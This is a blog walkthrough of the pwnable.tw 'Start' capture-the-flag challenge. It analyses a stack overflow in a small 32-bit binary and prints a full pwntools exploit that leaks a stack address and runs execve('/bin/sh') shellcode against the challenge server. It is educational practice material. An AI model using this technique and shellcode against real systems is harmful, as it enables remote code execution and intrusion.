---
layout: post
title:  "Pwnable TW Walkthrough"
date:   2024-12-27 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Start

The first challenge, we're given relatively small 32-bit binary:

```bash
$ checksec ./start
Arch:       i386-32-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX disabled
PIE:        No PIE (0x8048000)
Stripped:   No

$ file ./start
./start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

In addition to being statically linked, the binary has no libc, and seems to be a manually-written assembly file. IDA Decompilation attempt fails. \
By reading the assembly, it seems to be pushing the "Let's start the CTF:" string to the stack. It then 
writes this message to `stdout`. By using `stace`, we can see it then attempts to read 60 bytes off the user, right to the same stack address of the prompt string. Hence, linear stack overflow. \
The solution is simple - write shellcode, make sure the RA is set to its address. 

The main challenge is the fact that there's ASLR, and we have no leak. But notice the binary isn't PIE, hence we can jump to static code addresses. A very interesting code to jump to, is right before the call to `write`:

```bash
mov ecx, esp
mov dl, 14h
mov bl, 1
mov al, 4
int 80h  // sys_write
xor ebx, ebx
mov dl, 3Ch
mov al, 3
int 80h  // sys_read
```

This means we can easily obtain stack leak, as we can print values that resides within the stack. Win.

```python
#!/usr/bin/python3

from pwn import *
from time import sleep

HOST = 'chall.pwnable.tw'
PORT = 10000
context.arch='i386'
BINARY = './start'
GDB_SCRIPT = '''
b *_start+60
commands
    p "In start.."
end

c
'''

READ_BUF_SIZE = 60
WRITE_BUF_SIZE = 0x14
WRITE_STACK_BUF_TO_STDOUT_ADDR = 0x8048087
SHELLCODE = '''
mov ebx, {0}
xor ecx, ecx
xor edx, edx
push 0x0b
pop eax
int 0x80

BIN_SH:
.ascii "/bin/sh"
.byte 0x00
'''
# Unfortunately, x86 doesn't supports "lea ebx, [eip + BIN_SH]". Moved the raw offset for it..
OFFSET_TO_BIN_SH = 0x0e


def leak_stack_addr(p):
    buf = b'A' * WRITE_BUF_SIZE # pad
    buf += p32(WRITE_STACK_BUF_TO_STDOUT_ADDR)
    p.send(buf)
    leak_buf = p.recv(WRITE_BUF_SIZE)
    assert(len(leak_buf) == WRITE_BUF_SIZE)
    
    addr = u32(leak_buf[: 4])
    return addr

def write_and_jump_to_shellcode(p, shellcode_addr):
    buf = b'B' * WRITE_BUF_SIZE
    buf += p32(shellcode_addr) 
    shellcode_asm = SHELLCODE.format(shellcode_addr + OFFSET_TO_BIN_SH)
    log.info(f'Writing shellcode:\n{shellcode_asm}')
    buf += asm(shellcode_asm)
    buf += b'C' * (READ_BUF_SIZE - len(buf))
    p.send(buf)

def exploit(p):
    p.recvuntil(b"Let's start the CTF:")
    stack_leak = leak_stack_addr(p)    
    shellcode_addr = stack_leak + WRITE_BUF_SIZE
    log.info(f'stack_leak: {hex(stack_leak)} shellcode_addr: {hex(shellcode_addr)}')
    write_and_jump_to_shellcode(p, shellcode_addr)


def main():
    is_debug = False 
    is_remote = True
    if is_debug:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if is_remote:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```
